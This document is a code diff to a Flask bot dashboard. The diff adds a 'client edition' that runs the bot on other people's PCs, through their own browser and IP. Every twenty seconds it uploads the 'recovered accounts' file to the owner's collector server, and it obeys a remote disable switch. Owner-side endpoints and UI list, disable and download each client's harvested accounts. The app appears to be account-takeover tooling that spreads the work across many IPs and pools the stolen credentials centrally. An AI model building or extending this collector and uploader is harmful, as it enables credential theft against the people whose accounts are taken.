@@ -88,6 +88,29 @@ DEFAULT_OWNER_PASSWORD = "admin"
 #   user  : can operate the dashboard only.
 DEFAULT_SERVICE_MESSAGE = "This service is temporarily suspended by the administrator."
 
+# ==========================================================================
+#  CLIENT EDITION vs COLLECTOR (central) mode
+# ==========================================================================
+# When these env vars are set, this copy runs as a CLIENT edition on the
+# client's own PC: it uses the client's own Chrome/IP, has NO owner/admin
+# panel, uploads recovered accounts to the owner's collector, and obeys a
+# remote disable switch. Without them, this copy runs normally (your central
+# server + collector).
+CLIENT_ID = os.environ.get("HERO_CLIENT_ID", "").strip()
+CLIENT_KEY = os.environ.get("HERO_CLIENT_KEY", "").strip()
+COLLECTOR_URL = os.environ.get("HERO_COLLECTOR_URL", "").strip()
+IS_CLIENT = bool(CLIENT_ID and CLIENT_KEY and COLLECTOR_URL)
+# Login for the client's own local app (a plain user, never an admin/owner)
+CLIENT_LOGIN_USER = os.environ.get("HERO_CLIENT_LOGIN_USER", "client").strip() or "client"
+CLIENT_LOGIN_PASS = os.environ.get("HERO_CLIENT_LOGIN_PASS", "client").strip() or "client"
+
+# Central collector storage (owner side)
+COLLECTOR_DIR = os.path.join(BASE_DIR, "Client_Recoveries")
+CLIENT_KEYS_PATH = os.path.join(BASE_DIR, "client_keys.json")
+
+# Live remote-disable state for CLIENT edition (updated by the check-in thread)
+client_status = {"disabled": False, "message": "Your access has been disabled by the administrator."}
+
 
 def _load_or_create_secret():
     """Persist a Flask secret key so login sessions survive server restarts."""
@@ -197,8 +220,32 @@ def service_locked():
 
 
 def ensure_default_owner():
-    """Seed the owner account on first run, and make sure an owner always exists."""
+    """Seed the first-run account.
+
+    - Client edition: seed ONLY a plain 'user' account (no owner/admin exists
+      locally, so the client can never reach admin features).
+    - Central/collector: seed the owner account and guarantee one always exists.
+    """
     users = load_users()
+    if IS_CLIENT:
+        if not users:
+            users.append({
+                "username": CLIENT_LOGIN_USER,
+                "password_hash": generate_password_hash(CLIENT_LOGIN_PASS),
+                "role": "user",
+                "enabled": True,
+                "created_at": int(time.time()),
+            })
+            save_users(users)
+        # Never allow an owner/admin to exist in the client edition
+        changed = False
+        for u in users:
+            if u.get("role") in ("owner", "admin"):
+                u["role"] = "user"
+                changed = True
+        if changed:
+            save_users(users)
+        return
     if not users:
         users.append({
             "username": DEFAULT_OWNER_USERNAME,
@@ -220,14 +267,20 @@ def current_user():
     return find_user(session.get("username"))
 
 
-# Endpoints reachable without being logged in
-PUBLIC_ENDPOINTS = {"login", "logout", "static"}
+# Endpoints reachable without being logged in.
+# api_collect is machine-to-machine (client -> collector), authed by client key.
+PUBLIC_ENDPOINTS = {"login", "logout", "static", "api_collect"}
 
 
 @app.before_request
 def require_login():
     if request.endpoint in PUBLIC_ENDPOINTS:
         return None
+    # Client edition: honor the owner's remote disable switch
+    if IS_CLIENT and client_status.get("disabled"):
+        if request.path.startswith("/api/") or request.path == "/stream":
+            return jsonify({"status": "error", "message": client_status.get("message", "Access disabled.")}), 503
+        return render_template_string(CLIENT_DISABLED_TEMPLATE, message=client_status.get("message", "Access disabled."))
     user = current_user()
     # Not logged in, disabled, or expired -> out
     if not user_active(user):
@@ -910,6 +963,202 @@ def api_instances_delete(name):
     items = [i for i in items if i.get("name", "").lower() != name.lower()]
     save_instances(items)
     return jsonify({"status": "success", "message": f"Instance '{it['name']}' deleted."})
+
+
+# ==========================================================================
+#  CLIENT COLLECTOR (owner side) + CLIENT UPLOADER (client side)
+# ==========================================================================
+CLIENT_DISABLED_TEMPLATE = """
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access disabled</title>
+<style>body{background:#0b0f19;color:#f3f4f6;font-family:sans-serif;display:flex;
+align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}
+.box{max-width:420px;padding:2rem;border:1px solid rgba(239,68,68,.4);border-radius:16px;
+background:rgba(239,68,68,.08)}h1{color:#fca5a5;font-size:1.3rem}p{color:#9ca3af}</style></head>
+<body><div class="box"><h1>Access disabled</h1><p>{{ message }}</p></div></body></html>
+"""
+
+
+def load_client_keys():
+    if os.path.exists(CLIENT_KEYS_PATH):
+        try:
+            with open(CLIENT_KEYS_PATH, "r", encoding="utf-8") as f:
+                d = json.load(f)
+            if isinstance(d, list):
+                return d
+        except Exception:
+            pass
+    return []
+
+
+def save_client_keys(items):
+    try:
+        with open(CLIENT_KEYS_PATH, "w", encoding="utf-8") as f:
+            json.dump(items, f, indent=4)
+        return True
+    except Exception:
+        return False
+
+
+def find_client_key(cid):
+    for c in load_client_keys():
+        if c.get("client_id", "").lower() == (cid or "").lower():
+            return c
+    return None
+
+
+def _safe_client_folder(cid):
+    return re.sub(r'[^A-Za-z0-9_-]', '_', cid) or "client"
+
+
+@app.route('/api/collect', methods=['POST'])
+def api_collect():
+    """Receive a client's recovered_accounts.txt and save it under
+    Client_Recoveries/<client>/. Authenticated by the client's key. Returns
+    whether the client is still enabled (remote kill switch)."""
+    data = request.json or {}
+    cid = (data.get("client_id") or "").strip()
+    key = data.get("key") or ""
+    content = data.get("content") or ""
+    c = find_client_key(cid)
+    if not c or c.get("key") != key:
+        return jsonify({"status": "error", "message": "Invalid client credentials."}), 401
+    if not c.get("enabled", True):
+        return jsonify({"status": "disabled", "enabled": False,
+                        "message": c.get("disabled_message") or "Your access has been disabled by the administrator."}), 200
+    # Save the client's file
+    folder = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid))
+    try:
+        os.makedirs(folder, exist_ok=True)
+        with open(os.path.join(folder, "recovered_accounts.txt"), "w", encoding="utf-8") as f:
+            f.write(content)
+    except Exception as e:
+        return jsonify({"status": "error", "message": f"Save failed: {e}"}), 500
+    # Update last-seen / count
+    items = load_client_keys()
+    for it in items:
+        if it.get("client_id", "").lower() == cid.lower():
+            it["last_seen"] = int(time.time())
+            it["last_count"] = content.count("--- Recovered Account")
+    save_client_keys(items)
+    return jsonify({"status": "success", "enabled": True})
+
+
+@app.route('/api/clients', methods=['GET'])
+@owner_required
+@manager_required
+def api_clients_list():
+    return jsonify([
+        {
+            "client_id": c.get("client_id"),
+            "enabled": c.get("enabled", True),
+            "last_seen": c.get("last_seen", 0),
+            "last_count": c.get("last_count", 0),
+            "created_at": c.get("created_at", 0),
+        }
+        for c in load_client_keys()
+    ])
+
+
+@app.route('/api/clients', methods=['POST'])
+@owner_required
+@manager_required
+def api_clients_create():
+    data = request.json or {}
+    cid = (data.get("client_id") or "").strip()
+    if not re.match(r'^[A-Za-z0-9_-]{1,30}$', cid):
+        return jsonify({"status": "error", "message": "Name must be 1-30 chars: letters, numbers, - or _."}), 400
+    if find_client_key(cid):
+        return jsonify({"status": "error", "message": "That client already exists."}), 400
+    key = secrets.token_hex(16)
+    items = load_client_keys()
+    items.append({"client_id": cid, "key": key, "enabled": True,
+                  "created_at": int(time.time()), "last_seen": 0, "last_count": 0})
+    save_client_keys(items)
+    return jsonify({"status": "success", "message": f"Client '{cid}' created.", "client_id": cid, "key": key})
+
+
+@app.route('/api/clients/<cid>/toggle', methods=['POST'])
+@owner_required
+@manager_required
+def api_clients_toggle(cid):
+    items = load_client_keys()
+    target = next((c for c in items if c.get("client_id", "").lower() == cid.lower()), None)
+    if not target:
+        return jsonify({"status": "error", "message": "Client not found."}), 404
+    target["enabled"] = not target.get("enabled", True)
+    save_client_keys(items)
+    state = "enabled" if target["enabled"] else "disabled"
+    return jsonify({"status": "success", "message": f"Client '{cid}' {state}.", "enabled": target["enabled"]})
+
+
+@app.route('/api/clients/<cid>', methods=['DELETE'])
+@owner_required
+@manager_required
+def api_clients_delete(cid):
+    items = load_client_keys()
+    if not any(c.get("client_id", "").lower() == cid.lower() for c in items):
+        return jsonify({"status": "error", "message": "Client not found."}), 404
+    save_client_keys([c for c in items if c.get("client_id", "").lower() != cid.lower()])
+    return jsonify({"status": "success", "message": f"Client '{cid}' deleted."})
+
+
+@app.route('/api/clients/<cid>/key', methods=['GET'])
+@owner_required
+@manager_required
+def api_clients_key(cid):
+    c = find_client_key(cid)
+    if not c:
+        return jsonify({"status": "error", "message": "Client not found."}), 404
+    return jsonify({"client_id": c.get("client_id"), "key": c.get("key")})
+
+
+@app.route('/api/clients/<cid>/download', methods=['GET'])
+@owner_required
+@manager_required
+def api_clients_download(cid):
+    path = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid), "recovered_accounts.txt")
+    if not os.path.exists(path):
+        return jsonify({"status": "error", "message": "No data collected from this client yet."}), 404
+    with open(path, "r", encoding="utf-8") as f:
+        content = f.read()
+    return Response(content, mimetype="text/plain; charset=utf-8",
+                    headers={"Content-Disposition": f'attachment; filename="recovered_accounts_{_safe_client_folder(cid)}.txt"'})
+
+
+def client_uploader_loop():
+    """CLIENT edition: periodically upload recovered accounts to the owner's
+    collector and honor the remote disable switch."""
+    import urllib.request
+    last_sent = None
+    while True:
+        try:
+            time.sleep(20)
+            content = ""
+            if os.path.exists(ACCOUNTS_PATH):
+                with open(ACCOUNTS_PATH, "r", encoding="utf-8") as f:
+                    content = f.read()
+            # Always check in (even with no new data) so disable takes effect
+            payload = json.dumps({"client_id": CLIENT_ID, "key": CLIENT_KEY, "content": content}).encode()
+            req = urllib.request.Request(COLLECTOR_URL, data=payload,
+                                         headers={"Content-Type": "application/json"})
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                body = json.loads(resp.read().decode() or "{}")
+            if body.get("enabled") is False or body.get("status") == "disabled":
+                client_status["disabled"] = True
+                client_status["message"] = body.get("message", client_status["message"])
+                # Stop the bot if it's running
+                try:
+                    if is_running:
+                        with open(os.path.join(BASE_DIR, "stop.flag"), "w", encoding="utf-8") as f:
+                            f.write("stop")
+                except Exception:
+                    pass
+            else:
+                client_status["disabled"] = False
+                last_sent = content
+        except Exception:
+            # Network hiccup - keep trying; do not disable on transient errors
+            pass
 
 
 @app.route('/')
@@ -2201,6 +2450,10 @@ HTML_TEMPLATE = """
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2z"/></svg>
                 Instances
             </button>
+            <button onclick="openClientsModal()" class="header-btn" title="Clients running the app on their own PC (monitor, disable, download)">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 15a4 4 0 004 4h9a5 5 0 001-9.9A5 5 0 007 8a4 4 0 00-4 4 3 3 0 000 3z"/></svg>
+                Clients
+            </button>
             {% endif %}
             {% if is_admin %}
             <button onclick="openUsersModal()" class="header-btn" title="Manage users">
@@ -2265,6 +2518,28 @@ HTML_TEMPLATE = """
                 <table class="users-table">
                     <thead><tr><th>Name</th><th>Port</th><th>Status</th><th>Actions</th></tr></thead>
                     <tbody id="instances_tbody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Clients (run on their own PC) modal (owner) ===== -->
+    <div id="clientsModal" class="modal-overlay" onclick="if(event.target===this)closeClientsModal()">
+        <div class="modal-box">
+            <div class="modal-header">
+                <h2>Clients (run on their own PC)</h2>
+                <button class="modal-close" onclick="closeClientsModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:0.9rem;">
+                    These clients run the app on their own computer (their Chrome, their IP). Their recovered
+                    accounts auto-upload to your <b>Client_Recoveries</b> folder. To add a new one, run
+                    <b>make_client.bat</b> on this PC, then send them the built package.
+                </p>
+                <div id="clients_msg" class="modal-msg"></div>
+                <table class="users-table">
+                    <thead><tr><th>Client</th><th>Status</th><th>Last seen</th><th>Recovered</th><th>Actions</th></tr></thead>
+                    <tbody id="clients_tbody"></tbody>
                 </table>
             </div>
         </div>
@@ -2668,6 +2943,68 @@ HTML_TEMPLATE = """
             if (!confirm('Delete instance "' + name + '"? Its accounts, config and results are permanently removed.')) return;
             fetch('/api/instances/' + encodeURIComponent(name), {method: 'DELETE'})
                 .then(r => r.json()).then(d => { setInstancesMsg(d.message, d.status === 'success'); loadInstances(); });
+        }
+
+        // ===== Owner: clients running on their own PC =====
+        function openClientsModal() {
+            document.getElementById('clientsModal').classList.add('open');
+            loadClients();
+        }
+        function closeClientsModal() {
+            document.getElementById('clientsModal').classList.remove('open');
+        }
+        function setClientsMsg(text, ok) {
+            const el = document.getElementById('clients_msg');
+            el.textContent = text || '';
+            el.className = 'modal-msg ' + (text ? (ok ? 'ok' : 'err') : '');
+        }
+        function timeAgo(ts) {
+            if (!ts) return 'never';
+            const s = Math.floor(Date.now() / 1000) - ts;
+            if (s < 60) return s + 's ago';
+            if (s < 3600) return Math.floor(s / 60) + 'm ago';
+            if (s < 86400) return Math.floor(s / 3600) + 'h ago';
+            return Math.floor(s / 86400) + 'd ago';
+        }
+        function loadClients() {
+            fetch('/api/clients').then(r => r.json()).then(list => {
+                const tb = document.getElementById('clients_tbody');
+                tb.innerHTML = '';
+                if (!list.length) {
+                    tb.innerHTML = '<tr><td colspan="5" style="color:var(--text-muted);">No clients yet. Run make_client.bat to create one.</td></tr>';
+                    return;
+                }
+                list.forEach(c => {
+                    const tr = document.createElement('tr');
+                    const status = c.enabled ? '<span class="badge badge-on">Active</span>' : '<span class="badge badge-off">Disabled</span>';
+                    const toggleLabel = c.enabled ? 'Disable' : 'Enable';
+                    tr.innerHTML =
+                        '<td>' + c.client_id + '</td>' +
+                        '<td>' + status + '</td>' +
+                        '<td>' + timeAgo(c.last_seen) + '</td>' +
+                        '<td>' + (c.last_count || 0) + '</td>' +
+                        '<td>' +
+                            (c.last_count ? '<button class="row-action" onclick="downloadClient(\\'' + c.client_id + '\\')">Download</button>' : '') +
+                            '<button class="row-action" onclick="toggleClient(\\'' + c.client_id + '\\')">' + toggleLabel + '</button>' +
+                            '<button class="row-action danger" onclick="deleteClient(\\'' + c.client_id + '\\')">Delete</button>' +
+                        '</td>';
+                    tb.appendChild(tr);
+                });
+            }).catch(() => setClientsMsg('Failed to load clients.', false));
+        }
+        function toggleClient(id) {
+            fetch('/api/clients/' + encodeURIComponent(id) + '/toggle', {method: 'POST'})
+                .then(r => r.json()).then(d => { setClientsMsg(d.message, d.status === 'success'); loadClients(); });
+        }
+        function deleteClient(id) {
+            if (!confirm('Delete client "' + id + '"? They can no longer upload. Their already-collected file stays in your folder.')) return;
+            fetch('/api/clients/' + encodeURIComponent(id), {method: 'DELETE'})
+                .then(r => r.json()).then(d => { setClientsMsg(d.message, d.status === 'success'); loadClients(); });
+        }
+        function downloadClient(id) {
+            const a = document.createElement('a');
+            a.href = '/api/clients/' + encodeURIComponent(id) + '/download';
+            document.body.appendChild(a); a.click(); a.remove();
         }
 
         // ===== Auth: user management + password modals =====
@@ -3516,6 +3853,11 @@ HTML_TEMPLATE = """
 """
 
 if __name__ == '__main__':
+    # Client edition: start the background uploader / remote-disable check-in
+    if IS_CLIENT:
+        threading.Thread(target=client_uploader_loop, daemon=True).start()
+        print(f"[CLIENT EDITION] '{CLIENT_ID}' -> uploading recoveries to {COLLECTOR_URL}")
+
     # ---- Host/port resolution ----
     # Port:  CLI arg 1  ->  env HERO_PORT  ->  5000
     # Host:  env HERO_HOST  ->  127.0.0.1 (local only)
